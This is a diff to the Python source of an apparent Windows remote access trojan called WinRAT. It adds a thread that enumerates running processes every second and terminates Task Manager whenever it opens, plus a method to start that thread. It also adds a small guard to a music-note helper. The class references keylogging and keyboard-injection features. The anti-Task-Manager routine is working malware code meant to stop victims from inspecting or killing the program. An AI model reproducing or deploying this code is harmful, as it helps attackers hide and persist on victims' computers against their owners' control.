@@ -7,16 +7,105 @@
 import os
 import sys
 import struct
+import logging
+import threading
 from random import randrange
 import time
 from WinRATCore.constants import *
 from WinRATCore.structures import *
 import WinRATCore.kernel32api as kernel32api
+import WinRATCore.psapi as psapi
+
 
 def keyboard(code, flags=0):
 	return INPUT(INPUT_KEYBOARD, (KEYBDINPUT(code, 0, flags, 0, None)))
 
+"""
+	@method AntiTaskMGRRoutine
+	@brief Thread to kill the taskmanager if its open
+"""
+def AntiTaskMGRRoutine():
+
+	try:
+		count = 32
+
+		# Run forever, as we're in a thread recursion isn't advisable
+		while True:
+
+			#print("AntiTaskMGR: Enter taskmgr kill loop", flush=True)
+			# Enumerate running processes until we have the complete list
+			while True:
+
+				procIds = (DWORD*count)()
+				cb = ctypes.sizeof(procIds)
+				bytesRet = DWORD()
+
+				#print("AntiTaskMGR: Enter process enumeration loop", flush=True)			
+				if psapi.EnumProcesses(ctypes.byref(procIds), cb, ctypes.byref(bytesRet)):
+					
+					if bytesRet.value < cb:
+						#print("AntiTaskMGR: Process enumeration complete", flush=True)
+						break # We're done
+
+					# More processes, keep enumerating
+					else:
+						count *= 2
+
+				# Process eumeration failed
+				else:
+					#print("AntiTaskMGR: Call to EnumProcesses failed", flush=True)
+					break
+
+			#print("AntiTaskMGR: Iterating proclist...", flush=True)
+			# For every process id in the list
+			for i in range(bytesRet.value // ctypes.sizeof(DWORD)):
+				
+				# Open the process for termination
+				pid = procIds[i]
+				#print("AntiTaskMGR: ProcWithPid -> %lu" % pid, flush=True)
+				proc = kernel32api.OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, pid)
+
+				# If the process was opened
+				if proc:
+					
+					# Retrieve its name
+					imgFileName = (ctypes.c_char * MAX_PATH)()
+					if psapi.GetProcessImageFileName(proc, imgFileName, MAX_PATH) > 0:
+						filename = os.path.basename(imgFileName.value.decode('ascii')) # Get filename without path
+						
+						# If it is the task manager kill it
+						if filename == "Taskmgr.exe":
+							kernel32api.TerminateProcess(proc, 1)
+							print("No taskmgr for you!", flush=True)
+						else:
+							print(filename)
+
+					# Close the handle to the process
+					kernel32api.CloseHandle(proc)
+
+
+
+			# Wait a second before looking again
+			time.sleep(1)
+	except Exception as exc:
+		print(exc)
+
 class WinRAT:
+
+	def __init__(self):
+		self.keylogThread = None
+		self.antiTaskmgrThread = None
+
+	"""
+		@method antiTaskmgr
+		@brief Function to start / stop preventing taskmgr
+		@param state {int} 0=stop, 1=start
+	"""
+	def antiTaskmgr(self, start=1):
+
+		if start == 1:
+			self.antiTaskmgrThread = threading.Thread(target=AntiTaskMGRRoutine)
+			self.antiTaskmgrThread.start()
 
 	"""
 		@method cdtray
@@ -220,10 +309,14 @@ class WinRAT:
 		notes['A#4'] = 466
 		notes['B4']= 494
 
+		if name not in notes.keys():
+				return
+
 		if name == ".":
 			time.sleep( 0.125* duration)
 
 		else:
+
 			self.beep(dwFreq=notes[name],  dwDuration=125 * duration)
 
 	def playNotes(self, notes):
